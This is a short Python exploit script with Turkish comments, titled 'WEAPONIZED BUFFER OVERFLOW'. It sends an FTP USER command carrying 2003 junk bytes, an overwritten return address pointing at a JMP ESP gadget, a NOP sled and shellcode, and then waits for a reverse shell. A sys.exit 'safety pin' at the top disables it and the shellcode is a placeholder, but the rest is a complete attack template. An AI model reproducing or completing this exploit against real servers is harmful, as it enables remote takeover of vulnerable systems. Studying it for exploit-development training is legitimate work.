import socket
import sys

# --- EMNİYET PİMİ ---
sys.exit("UYARI: Buffer Overflow saldırısı konseptidir.")

print("--- WEAPONIZED BUFFER OVERFLOW ---")

target_ip = "192.168.1.20"
target_port = 21 # FTP Servisi

def exploit_target():
    # 1. OFFSET HESAPLAMA (Weaponized Part)
    # Simülasyonda rastgele 5000 'A' gönderiyorduk.
    # Gerçekte programın tam çöktüğü noktayı (Offset) bulup oraya EIP adresini yazıyoruz.
    
    # Junk (Çöp) Veri
    buffer = b"A" * 2003 
    
    # EIP (Execution Instruction Pointer) - Kontrolü ele aldığımız yer
    # Program buradaki adrese atlayacak (Örn: JMP ESP komutunun adresi)
    eip = b"\xAF\x11\x50\x62" 
    
    # NOP Sled (İşlemci kaydırağı)
    nops = b"\x90" * 32
    
    # Shellcode (Zararlı Kod - Reverse Shell)
    shellcode = b"\xcc\xcc\xcc..." # (Temsili Shellcode)
    
    # 2. PAYLOAD BİRLEŞTİRME
    payload = buffer + eip + nops + shellcode
    
    print(f"[*] Payload gönderiliyor ({len(payload)} bytes)...")
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((target_ip, target_port))
        s.recv(1024)
        s.send(b"USER " + payload + b"\r\n")
        print("💀 EXPLOIT GÖNDERİLDİ. Shell bağlantısı bekleniyor.")
    except Exception as e:
        print(f"[-] Hata: {e}")
    finally:
        s.close()

if __name__ == "__main__":
    exploit_target()